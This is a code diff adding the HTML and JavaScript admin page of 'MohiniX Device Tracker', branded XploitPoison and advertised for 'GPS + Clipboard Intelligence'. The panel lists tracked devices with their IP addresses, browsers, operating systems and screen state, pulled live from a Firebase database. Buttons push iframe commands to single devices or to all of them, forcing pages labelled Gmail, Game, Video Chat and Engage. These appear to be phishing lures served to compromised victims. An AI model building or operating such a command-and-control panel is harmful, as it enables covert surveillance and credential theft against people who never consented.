@@ -1,0 +1,940 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover">
+    <title>⚡ MohiniX - Premium Device Tracker</title>
+
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --bg-gradient-start: #0f0c29;
+            --bg-gradient-middle: #302b63;
+            --bg-gradient-end: #24243e;
+            --card-bg: rgba(255, 255, 255, 0.1);
+            --text-primary: white;
+            --text-secondary: rgba(255, 255, 255, 0.6);
+            --border-color: rgba(255, 255, 255, 0.2);
+            --accent-color: #4ade80;
+            --status-online: #4ade80;
+            --status-offline: #ef4444;
+        }
+
+        body.theme-light {
+            --bg-gradient-start: #f5f7fa;
+            --bg-gradient-middle: #e4e8f0;
+            --bg-gradient-end: #d9e0e8;
+            --card-bg: rgba(0, 0, 0, 0.05);
+            --text-primary: #1a1a2e;
+            --text-secondary: #4a5568;
+            --border-color: rgba(0, 0, 0, 0.1);
+            --accent-color: #10b981;
+        }
+
+        body.theme-blue {
+            --bg-gradient-start: #1e3c72;
+            --bg-gradient-middle: #2a5298;
+            --bg-gradient-end: #1e3c72;
+            --accent-color: #60a5fa;
+        }
+
+        body.theme-green {
+            --bg-gradient-start: #064e3b;
+            --bg-gradient-middle: #047857;
+            --bg-gradient-end: #065f46;
+            --accent-color: #34d399;
+        }
+
+        body.theme-purple {
+            --bg-gradient-start: #4c1d95;
+            --bg-gradient-middle: #6d28d9;
+            --bg-gradient-end: #5b21b6;
+            --accent-color: #c084fc;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: linear-gradient(135deg, var(--bg-gradient-start), var(--bg-gradient-middle), var(--bg-gradient-end));
+            min-height: 100vh;
+            padding: 16px;
+            transition: background 0.3s ease;
+        }
+
+        .admin-container {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        .admin-header {
+            background: var(--card-bg);
+            backdrop-filter: blur(15px);
+            border-radius: 24px;
+            padding: 16px 20px;
+            margin-bottom: 20px;
+            border: 1px solid var(--border-color);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 15px;
+        }
+
+        .header-title h1 {
+            color: var(--text-primary);
+            font-size: 22px;
+        }
+
+        .header-title p {
+            color: var(--text-secondary);
+            font-size: 12px;
+        }
+
+        .theme-selector {
+            display: flex;
+            gap: 8px;
+            background: rgba(0, 0, 0, 0.2);
+            padding: 6px 12px;
+            border-radius: 30px;
+        }
+
+        .theme-btn {
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            cursor: pointer;
+            border: 2px solid transparent;
+            transition: all 0.2s;
+        }
+
+        .theme-btn.active {
+            border-color: white;
+            transform: scale(1.1);
+        }
+
+        .theme-dark {
+            background: linear-gradient(135deg, #0f0c29, #24243e);
+        }
+
+        .theme-light {
+            background: linear-gradient(135deg, #f5f7fa, #d9e0e8);
+        }
+
+        .theme-blue {
+            background: linear-gradient(135deg, #1e3c72, #2a5298);
+        }
+
+        .theme-green {
+            background: linear-gradient(135deg, #064e3b, #065f46);
+        }
+
+        .theme-purple {
+            background: linear-gradient(135deg, #4c1d95, #5b21b6);
+        }
+
+        .stats-badge {
+            display: flex;
+            gap: 12px;
+            flex-wrap: wrap;
+            align-items: center;
+        }
+
+        .stat {
+            background: rgba(0, 0, 0, 0.3);
+            padding: 8px 16px;
+            border-radius: 20px;
+            text-align: center;
+            min-width: 80px;
+        }
+
+        .stat .number {
+            font-size: 22px;
+            font-weight: bold;
+            color: var(--accent-color);
+        }
+
+        .stat .label {
+            font-size: 10px;
+            color: var(--text-secondary);
+        }
+
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 12px;
+            margin-bottom: 20px;
+        }
+
+        .stat-card {
+            background: var(--card-bg);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 16px;
+            text-align: center;
+            border: 1px solid var(--border-color);
+        }
+
+        .stat-card .icon {
+            font-size: 28px;
+            margin-bottom: 8px;
+        }
+
+        .stat-card .value {
+            font-size: 24px;
+            font-weight: bold;
+            color: var(--text-primary);
+        }
+
+        .stat-card .label {
+            font-size: 11px;
+            color: var(--text-secondary);
+        }
+
+        .devices-section {
+            background: var(--card-bg);
+            backdrop-filter: blur(10px);
+            border-radius: 24px;
+            padding: 20px;
+            margin-bottom: 20px;
+            border: 1px solid var(--border-color);
+        }
+
+        .section-title {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+            gap: 12px;
+        }
+
+        .section-title h2 {
+            color: var(--text-primary);
+            font-size: 18px;
+        }
+
+        .search-filter {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+        }
+
+        .search-box {
+            display: flex;
+            gap: 8px;
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 30px;
+            padding: 5px 15px;
+            border: 1px solid var(--border-color);
+        }
+
+        .search-box input {
+            background: transparent;
+            border: none;
+            padding: 10px 0;
+            color: var(--text-primary);
+            font-size: 14px;
+            outline: none;
+            width: 180px;
+        }
+
+        .search-box input::placeholder {
+            color: var(--text-secondary);
+        }
+
+        .search-box button {
+            background: none;
+            border: none;
+            color: var(--accent-color);
+            font-size: 18px;
+            cursor: pointer;
+        }
+
+        .filter-chips {
+            display: flex;
+            gap: 8px;
+            flex-wrap: wrap;
+        }
+
+        .filter-btn {
+            background: rgba(255, 255, 255, 0.1);
+            border: none;
+            padding: 8px 16px;
+            border-radius: 30px;
+            color: var(--text-primary);
+            cursor: pointer;
+            font-size: 12px;
+        }
+
+        .filter-btn.active {
+            background: var(--accent-color);
+            color: #000;
+        }
+
+        .device-table-container {
+            overflow-x: auto;
+        }
+
+        .device-table {
+            width: 100%;
+            border-collapse: collapse;
+            min-width: 600px;
+        }
+
+        .device-table th {
+            text-align: left;
+            padding: 12px 10px;
+            color: var(--text-secondary);
+            font-size: 12px;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .device-table td {
+            padding: 12px 10px;
+            color: var(--text-primary);
+            font-size: 13px;
+            border-bottom: 1px solid var(--border-color);
+            cursor: pointer;
+        }
+
+        .device-table tr:hover {
+            background: rgba(255, 255, 255, 0.1);
+        }
+
+        .status-badge {
+            display: inline-block;
+            padding: 4px 10px;
+            border-radius: 20px;
+            font-size: 10px;
+            font-weight: bold;
+        }
+
+        .status-online {
+            background: rgba(74, 222, 128, 0.2);
+            color: var(--status-online);
+            border: 1px solid var(--status-online);
+        }
+
+        .status-offline {
+            background: rgba(239, 68, 68, 0.2);
+            color: var(--status-offline);
+            border: 1px solid var(--status-offline);
+        }
+
+        .screen-badge-on {
+            background: rgba(74, 222, 128, 0.2);
+            color: #4ade80;
+            border: 1px solid #4ade80;
+            padding: 2px 8px;
+            border-radius: 15px;
+            font-size: 10px;
+        }
+
+        .screen-badge-off {
+            background: rgba(156, 163, 175, 0.2);
+            color: #9ca3af;
+            border: 1px solid #9ca3af;
+            padding: 2px 8px;
+            border-radius: 15px;
+            font-size: 10px;
+        }
+
+        .view-btn {
+            background: rgba(74, 222, 128, 0.2);
+            border: 1px solid var(--accent-color);
+            color: var(--accent-color);
+            padding: 5px 12px;
+            border-radius: 15px;
+            cursor: pointer;
+            font-size: 11px;
+        }
+
+        .view-btn:hover {
+            background: var(--accent-color);
+            color: #000;
+        }
+
+        .refresh-btn {
+            background: rgba(74, 222, 128, 0.2);
+            border: 1px solid var(--accent-color);
+            color: var(--accent-color);
+            padding: 8px 16px;
+            border-radius: 25px;
+            cursor: pointer;
+            font-size: 12px;
+        }
+
+        .logout-header-btn {
+            background: #ef4444;
+            color: white;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 25px;
+            cursor: pointer;
+            font-size: 12px;
+            font-weight: bold;
+        }
+
+        .logout-header-btn:hover {
+            background: #dc2626;
+        }
+
+        .toast {
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #1e293b;
+            color: white;
+            padding: 10px 20px;
+            border-radius: 30px;
+            font-size: 12px;
+            display: none;
+            z-index: 1000;
+        }
+
+        @media (max-width: 768px) {
+            .device-table thead {
+                display: none;
+            }
+
+            .device-table,
+            .device-table tbody,
+            .device-table tr,
+            .device-table td {
+                display: block;
+                width: 100%;
+            }
+
+            .device-table tr {
+                margin-bottom: 16px;
+                background: rgba(255, 255, 255, 0.05);
+                border-radius: 16px;
+                padding: 12px;
+                cursor: pointer;
+            }
+
+            .device-table td {
+                display: flex;
+                justify-content: space-between;
+                align-items: center;
+                padding: 8px 12px;
+                text-align: right;
+            }
+
+            .device-table td::before {
+                content: attr(data-label);
+                font-weight: bold;
+                color: var(--text-secondary);
+                font-size: 11px;
+                text-align: left;
+            }
+
+            .search-filter {
+                width: 100%;
+                flex-direction: column;
+            }
+
+            .search-box {
+                width: 100%;
+            }
+
+            .search-box input {
+                width: 100%;
+            }
+        }
+
+        .logo-brand {
+            display: flex;
+            align-items: center;
+        }
+
+        .logo-container {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            background: rgba(0, 0, 0, 0.3);
+            padding: 8px 15px;
+            border-radius: 30px;
+        }
+
+        .brand-logo {
+            width: 40px;
+            height: 40px;
+            border-radius: 10px;
+            object-fit: cover;
+            background: white;
+            padding: 4px;
+        }
+
+        .brand-name {
+            font-size: 16px;
+            font-weight: bold;
+            color: #4ade80;
+        }
+
+        .brand-domain {
+            font-size: 9px;
+            color: rgba(255, 255, 255, 0.5);
+            margin-top: 2px;
+        }
+
+        @media (max-width: 768px) {
+            .admin-header {
+                flex-direction: column;
+                align-items: flex-start;
+                gap: 15px;
+            }
+
+            .logo-container {
+                padding: 5px 12px;
+            }
+
+            .brand-logo {
+                width: 32px;
+                height: 32px;
+            }
+
+            .brand-name {
+                font-size: 14px;
+            }
+        }
+
+        .logo-link {
+            text-decoration: none;
+            cursor: pointer;
+            transition: transform 0.2s ease;
+        }
+
+        .logo-link:hover {
+            transform: scale(1.02);
+        }
+
+        .logo-link:active {
+            transform: scale(0.98);
+        }
+
+        .logo-container {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            background: rgba(0, 0, 0, 0.3);
+            padding: 8px 15px;
+            border-radius: 30px;
+            transition: all 0.2s;
+        }
+
+        .logo-link:hover .logo-container {
+            background: rgba(74, 222, 128, 0.2);
+            border: 1px solid #4ade80;
+        }
+
+        .logo-link:hover .brand-name {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+
+<body class="theme-dark">
+
+    <div class="admin-container">
+        <div class="admin-header">
+            <a href="https://www.xploitpoison.com/" target="_blank" class="logo-link" rel="noopener noreferrer">
+                <div class="logo-container">
+                    <img src="https://cdn5.telesco.pe/file/HeK1a_SsOWA0jcJLG_m-Z3ut1PVqbRZM4BEyFmyEuEKv9gP9__Z3yUzhm_etJW2TK8Uv5MzlarCPstK7EVo94ZFWf05V6F7OZWCpfYW7GCZmuLDtFk3ji4QhpZyf3KYd87tbIkWzWjdsgReM4sT8sFteYFwULez4oWVeFwQcrmoWKRickNuZTqMXN0Y1b7ZU80dAOYIHDi6w5IS9V7yhdnu8GovZ9WlAz_RJxog1SOYEZkhyF-FAXBnl6o8B5N254MpQeG0ZHv_QHJdj27y1p0GskzI2kumRD-AlSloRzpPC5r58hA2oWk9zCxGRYSB8lJCN8S9a9GpZ3ym3qyxXAg.jpg"
+                        alt="XploitPoison" class="brand-logo"
+                        onerror="this.src='https://via.placeholder.com/45?text=XP'">
+                    <div>
+                        <div class="brand-name">XploitPoison</div>
+                        <div class="brand-domain">xploitpoison.com</div>
+                    </div>
+                </div>
+            </a>
+
+            <div class="header-title">
+                <h1>⚡ MohiniX Device Tracker</h1>
+                <p>Premium Edition | GPS + Clipboard Intelligence</p>
+            </div>
+
+            <div class="stats-badge">
+                <div class="theme-selector">
+                    <div class="theme-btn theme-dark" onclick="setTheme('dark')" title="Dark"></div>
+                    <div class="theme-btn theme-light" onclick="setTheme('light')" title="Light"></div>
+                    <div class="theme-btn theme-blue" onclick="setTheme('blue')" title="Blue"></div>
+                    <div class="theme-btn theme-green" onclick="setTheme('green')" title="Green"></div>
+                    <div class="theme-btn theme-purple" onclick="setTheme('purple')" title="Purple"></div>
+                </div>
+                <div class="stat">
+                    <div class="number" id="totalDevices">0</div>
+                    <div class="label">Total</div>
+                </div>
+                <div class="stat">
+                    <div class="number" id="onlineDevices">0</div>
+                    <div class="label">Online</div>
+                </div>
+                <button class="refresh-btn" onclick="manualRefresh()">🔄</button>
+                <button class="logout-header-btn" onclick="logout()">🚪 Logout</button>
+            </div>
+        </div>
+
+        <!-- Global Controls -->
+        <div style="margin-bottom: 20px; padding: 15px; background: rgba(0,0,0,0.3); border-radius: 15px;">
+            <strong style="color:white;">🌍 GLOBAL COMMANDS (All Devices)</strong><br>
+            <div style="display: flex; gap: 10px; margin-top: 10px; flex-wrap: wrap;">
+                <button onclick="sendGlobalIframeCommand('gmail')"
+                    style="background:#ea4335; border:none; padding:8px 15px; border-radius:20px; cursor:pointer; color:#fff; font-weight:bold;">📧
+                    All → Gmail</button>
+                <button onclick="sendGlobalIframeCommand('game')"
+                    style="background:#4ade80; border:none; padding:8px 15px; border-radius:20px; cursor:pointer; color:#000; font-weight:bold;">🎮
+                    All → Game</button>
+                <button onclick="sendGlobalIframeCommand('videochat')"
+                    style="background:#fbbf24; border:none; padding:8px 15px; border-radius:20px; cursor:pointer; color:#000; font-weight:bold;">💬
+                    All → Video Chat</button>
+                <button onclick="sendGlobalIframeCommand('engage')"
+                    style="background:#667eea; border:none; padding:8px 15px; border-radius:20px; cursor:pointer; color:#fff; font-weight:bold;">🎯
+                    All → Engage</button>
+            </div>
+        </div>
+
+        <div class="stats-grid">
+            <div class="stat-card">
+                <div class="icon">🌐</div>
+                <div class="value" id="browsersCount">0</div>
+                <div class="label">Browsers</div>
+            </div>
+            <div class="stat-card">
+                <div class="icon">💻</div>
+                <div class="value" id="osCount">0</div>
+                <div class="label">OS Types</div>
+            </div>
+            <div class="stat-card">
+                <div class="icon">📱</div>
+                <div class="value" id="screenOnCount">0</div>
+                <div class="label">Screen ON</div>
+            </div>
+            <div class="stat-card">
+                <div class="icon">📱</div>
+                <div class="value" id="screenOffCount">0</div>
+                <div class="label">Screen OFF</div>
+            </div>
+        </div>
+
+        <div class="devices-section">
+            <div class="section-title">
+                <h2>📱 Connected Devices</h2>
+                <div class="search-filter">
+                    <div class="search-box">
+                        <input type="text" id="searchInput" placeholder="🔍 Search device..." onkeyup="filterDevices()">
+                        <button onclick="manualRefresh()">🔄</button>
+                    </div>
+                    <div class="filter-chips">
+                        <button class="filter-btn active" data-filter="all" onclick="setFilter('all')">All</button>
+                        <button class="filter-btn" data-filter="online" onclick="setFilter('online')">🟢 Online</button>
+                        <button class="filter-btn" data-filter="offline" onclick="setFilter('offline')">🔴
+                            Offline</button>
+                    </div>
+                </div>
+            </div>
+            <div class="device-table-container">
+                <table class="device-table">
+                    <thead>
+                        <tr>
+                            <th>Device ID</th>
+                            <th>Status</th>
+                            <th>Browser/OS</th>
+                            <th>IP Address</th>
+                            <th>Screen</th>
+                            <th>Last Seen</th>
+                            <th>Action</th>
+                        </tr>
+                    </thead>
+                    <tbody id="devicesTableBody">
+                        <tr>
+                            <td colspan="7" style="text-align: center;">Loading devices...</td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+    </div>
+
+    <div id="toast" class="toast"></div>
+
+    <script src="config.js"></script>
+    <script>
+        let database = null;
+        let allDevices = new Map();
+        let onlineStatus = new Map();
+        let currentFilter = 'all';
+        let searchTerm = '';
+
+        // ==================== AUTHENTICATION CHECK ====================
+        function checkAuth() {
+            const isLoggedIn = sessionStorage.getItem('mohini_auth');
+            const loginTime = sessionStorage.getItem('mohini_login_time');
+
+            if (!isLoggedIn || isLoggedIn !== 'true') {
+                window.location.href = 'login.html';
+                return false;
+            }
+
+            if (loginTime) {
+                const now = Date.now();
+                const timeDiff = now - parseInt(loginTime);
+                const hoursDiff = timeDiff / (1000 * 60 * 60);
+
+                if (hoursDiff >= 24) {
+                    sessionStorage.clear();
+                    window.location.href = 'login.html';
+                    return false;
+                }
+            }
+
+            return true;
+        }
+
+        function logout() {
+            sessionStorage.clear();
+            showToast('Logged out successfully', false);
+            setTimeout(() => {
+                window.location.href = 'login.html';
+            }, 500);
+        }
+
+        // ==================== THEME MANAGEMENT ====================
+        function setTheme(theme) {
+            document.body.className = `theme-${theme}`;
+            localStorage.setItem('admin_theme', theme);
+            document.querySelectorAll('.theme-btn').forEach(btn => btn.classList.remove('active'));
+            document.querySelector(`.theme-${theme}`).classList.add('active');
+            showToast(`Theme changed to ${theme}`, false);
+        }
+
+        function loadSavedTheme() {
+            const savedTheme = localStorage.getItem('admin_theme');
+            if (savedTheme) setTheme(savedTheme);
+            else document.querySelector('.theme-dark').classList.add('active');
+        }
+
+        // ==================== FIREBASE INIT ====================
+        function initFirebase() {
+            if (typeof firebaseConfig !== 'undefined') {
+                if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
+                database = firebase.database();
+                console.log('✅ Firebase ready');
+                startAdminPanel();
+            } else {
+                document.getElementById('devicesTableBody').innerHTML = '<tr><td colspan="7" style="text-align:center;color:red;">config.js not found!</td></tr>';
+            }
+        }
+
+        function showToast(message, isError = false) {
+            const toast = document.getElementById('toast');
+            toast.textContent = message;
+            toast.style.background = isError ? '#ef4444' : '#10b981';
+            toast.style.display = 'block';
+            setTimeout(() => toast.style.display = 'none', 2000);
+        }
+
+        function viewDevice(deviceId) {
+            localStorage.setItem('selectedDeviceId', deviceId);
+            window.location.href = `device.html?id=${encodeURIComponent(deviceId)}`;
+        }
+
+        function sendIframeCommandToDevice(deviceId, page) {
+            if (!deviceId) { showToast('No device selected', true); return; }
+            const command = { page: page, active: true, timestamp: Date.now(), fromAdmin: true };
+            database.ref(`admin_commands/${deviceId}/iframe`).set(command)
+                .then(() => showToast(`✅ Command sent to ${deviceId.substring(0, 15)}... - Page: ${page}`, false))
+                .catch(err => showToast('❌ Failed to send command', true));
+        }
+
+        function sendGlobalIframeCommand(page) {
+            const command = { page: page, active: true, timestamp: Date.now(), fromAdmin: true };
+            database.ref(`admin_commands/global/iframe`).set(command)
+                .then(() => showToast(`✅ Global command sent! All devices will show: ${page}`, false))
+                .catch(err => showToast('❌ Failed to send global command', true));
+        }
+
+        function updateDeviceStatusOnly(deviceId, statusData) {
+            const row = document.getElementById(`row_${deviceId}`);
+            if (!row) return;
+            const isOnline = statusData?.status === 'online';
+            const statusCell = row.querySelector('.status-cell');
+            const lastSeenCell = row.querySelector('.lastseen-cell');
+            const screenCell = row.querySelector('.screen-cell');
+            if (statusCell) statusCell.innerHTML = `<span class="status-badge ${isOnline ? 'status-online' : 'status-offline'}">${isOnline ? '🟢 Online' : '🔴 Offline'}</span>`;
+            if (lastSeenCell && statusData?.lastSeenTime) lastSeenCell.innerHTML = statusData.lastSeenTime;
+            if (screenCell && statusData?.screen) {
+                const isScreenOn = statusData.screen === 'ON';
+                screenCell.innerHTML = `<span class="${isScreenOn ? 'screen-badge-on' : 'screen-badge-off'}">${isScreenOn ? '📱 ON' : '📴 OFF'}</span>`;
+            }
+            row.setAttribute('data-status', isOnline ? 'online' : 'offline');
+            filterDevices();
+            updateScreenStats();
+        }
+
+        function updateScreenStats() {
+            let screenOn = 0, screenOff = 0;
+            allDevices.forEach((device, deviceId) => {
+                const status = onlineStatus.get(deviceId);
+                if (status?.screen === 'ON') screenOn++;
+                else if (status?.screen === 'OFF') screenOff++;
+            });
+            document.getElementById('screenOnCount').innerHTML = screenOn;
+            document.getElementById('screenOffCount').innerHTML = screenOff;
+        }
+
+        function addDeviceToTable(deviceId, device) {
+            const tbody = document.getElementById('devicesTableBody');
+            const statusData = onlineStatus.get(deviceId);
+            const isOnline = statusData?.status === 'online';
+            const lastSeen = statusData?.lastSeenTime || device?.lastSeenTime || 'Never';
+            const screenStatus = statusData?.screen || device?.screenStatus || '--';
+            const isScreenOn = screenStatus === 'ON';
+
+            const row = document.createElement('tr');
+            row.id = `row_${deviceId}`;
+            row.setAttribute('data-device-id', deviceId);
+            row.setAttribute('data-status', isOnline ? 'online' : 'offline');
+            row.style.cursor = 'pointer';
+            row.onclick = (e) => {
+                if (!e.target.classList?.contains('view-btn') && !e.target.classList?.contains('cmd-btn')) {
+                    viewDevice(deviceId);
+                }
+            };
+
+            row.innerHTML = `
+                <td data-label="Device ID"><code>${deviceId.substring(0, 20)}...</code></td>
+                <td data-label="Status" class="status-cell"><span class="status-badge ${isOnline ? 'status-online' : 'status-offline'}">${isOnline ? '🟢 Online' : '🔴 Offline'}</span></td>
+                <td data-label="Browser/OS" class="browser-cell">${device?.browser || '?'} / ${device?.os || '?'}</td>
+                <td data-label="IP Address" class="ip-cell">${device?.ip || 'N/A'}</td>
+                <td data-label="Screen" class="screen-cell"><span class="${isScreenOn ? 'screen-badge-on' : 'screen-badge-off'}">${isScreenOn ? '📱 ON' : '📴 OFF'}</span></td>
+                <td data-label="Last Seen" class="lastseen-cell">${lastSeen}</td>
+                <td data-label="Action">
+                    <button class="view-btn" onclick="event.stopPropagation(); viewDevice('${deviceId}')">View</button>
+                    <button class="cmd-btn" onclick="event.stopPropagation(); sendIframeCommandToDevice('${deviceId}', 'gmail')" style="background:#ea4335; border:none; padding:5px 8px; border-radius:12px; cursor:pointer; margin-left:5px; font-size:10px; color:white;">📧</button>
+                    <button class="cmd-btn" onclick="event.stopPropagation(); sendIframeCommandToDevice('${deviceId}', 'game')" style="background:#4ade80; border:none; padding:5px 8px; border-radius:12px; cursor:pointer; margin-left:5px; font-size:10px;">🎮</button>
+                    <button class="cmd-btn" onclick="event.stopPropagation(); sendIframeCommandToDevice('${deviceId}', 'videochat')" style="background:#fbbf24; border:none; padding:5px 8px; border-radius:12px; cursor:pointer; margin-left:5px; font-size:10px;">💬</button>
+                    <button class="cmd-btn" onclick="event.stopPropagation(); sendIframeCommandToDevice('${deviceId}', 'engage')" style="background:#667eea; border:none; padding:5px 8px; border-radius:12px; cursor:pointer; margin-left:5px; font-size:10px; color:white;">🎯</button>
+                </td>
+            `;
+            tbody.appendChild(row);
+            filterDevices();
+        }
+
+        function updateDeviceInTable(deviceId, newData) {
+            const row = document.getElementById(`row_${deviceId}`);
+            if (!row) return;
+            const browserCell = row.querySelector('.browser-cell');
+            const ipCell = row.querySelector('.ip-cell');
+            if (browserCell) browserCell.innerHTML = `${newData.browser || '?'} / ${newData.os || '?'}`;
+            if (ipCell) ipCell.innerHTML = newData.ip || 'N/A';
+        }
+
+        function loadDevices() {
+            if (!database) return;
+            database.ref('devices').on('value', (snapshot) => {
+                const devices = snapshot.val();
+                if (devices) {
+                    Object.keys(devices).forEach(key => {
+                        const device = devices[key];
+                        device.deviceId = key;
+                        if (!allDevices.has(key)) { allDevices.set(key, device); addDeviceToTable(key, device); }
+                        else updateDeviceInTable(key, device);
+                    });
+                }
+                updateStats();
+                updateScreenStats();
+            });
+        }
+
+        function listenOnlineStatus() {
+            if (!database) return;
+            database.ref('online_devices').on('child_added', (s) => { onlineStatus.set(s.key, s.val()); updateDeviceStatusOnly(s.key, s.val()); updateStatsOnly(); });
+            database.ref('online_devices').on('child_changed', (s) => { onlineStatus.set(s.key, s.val()); updateDeviceStatusOnly(s.key, s.val()); updateStatsOnly(); });
+            database.ref('online_devices').on('child_removed', (s) => { onlineStatus.delete(s.key); updateDeviceStatusOnly(s.key, { status: 'offline' }); updateStatsOnly(); });
+        }
+
+        function updateStatsOnly() {
+            const online = Array.from(onlineStatus.values()).filter(s => s?.status === 'online').length;
+            document.getElementById('onlineDevices').innerHTML = online;
+        }
+
+        function updateStats() {
+            const total = allDevices.size;
+            const online = Array.from(onlineStatus.values()).filter(s => s?.status === 'online').length;
+            const browsers = new Set(), osList = new Set();
+            allDevices.forEach(device => { if (device.browser) browsers.add(device.browser); if (device.os) osList.add(device.os); });
+            document.getElementById('totalDevices').innerHTML = total;
+            document.getElementById('onlineDevices').innerHTML = online;
+            document.getElementById('browsersCount').innerHTML = browsers.size;
+            document.getElementById('osCount').innerHTML = osList.size;
+        }
+
+        function filterDevices() {
+            searchTerm = document.getElementById('searchInput').value.toLowerCase();
+            const rows = document.querySelectorAll('#devicesTableBody tr');
+            rows.forEach(row => {
+                const deviceId = row.getAttribute('data-device-id') || '';
+                const searchMatch = deviceId.toLowerCase().includes(searchTerm);
+                let statusMatch = true;
+                if (currentFilter === 'online') statusMatch = row.getAttribute('data-status') === 'online';
+                else if (currentFilter === 'offline') statusMatch = row.getAttribute('data-status') === 'offline';
+                row.style.display = (searchMatch && statusMatch) ? '' : 'none';
+            });
+        }
+
+        function setFilter(filter) {
+            currentFilter = filter;
+            document.querySelectorAll('.filter-btn').forEach(btn => btn.classList.remove('active'));
+            document.querySelector(`.filter-btn[data-filter="${filter}"]`).classList.add('active');
+            filterDevices();
+        }
+
+        function manualRefresh() {
+            showToast('🔄 Refreshing...', false);
+            database.ref('online_devices').once('value', (s) => {
+                onlineStatus.clear();
+                s.forEach((child) => { onlineStatus.set(child.key, child.val()); updateDeviceStatusOnly(child.key, child.val()); });
+                updateStatsOnly();
+                updateScreenStats();
+                showToast('✅ Refreshed!', false);
+            });
+        }
+
+        function startAdminPanel() {
+            loadDevices();
+            listenOnlineStatus();
+            loadSavedTheme();
+            console.log('✅ Admin Panel Ready');
+            showToast('Admin Panel Ready', false);
+        }
+
+        // ==================== INITIALIZE ====================
+        // Check authentication first
+        if (checkAuth()) {
+            if (typeof firebaseConfig !== 'undefined') {
+                initFirebase();
+            } else {
+                window.addEventListener('load', () => {
+                    if (typeof firebaseConfig !== 'undefined') {
+                        initFirebase();
+                    } else {
+                        alert('config.js not found!');
+                    }
+                });
+            }
+        }
+    </script>
+</body>
+
+</html>
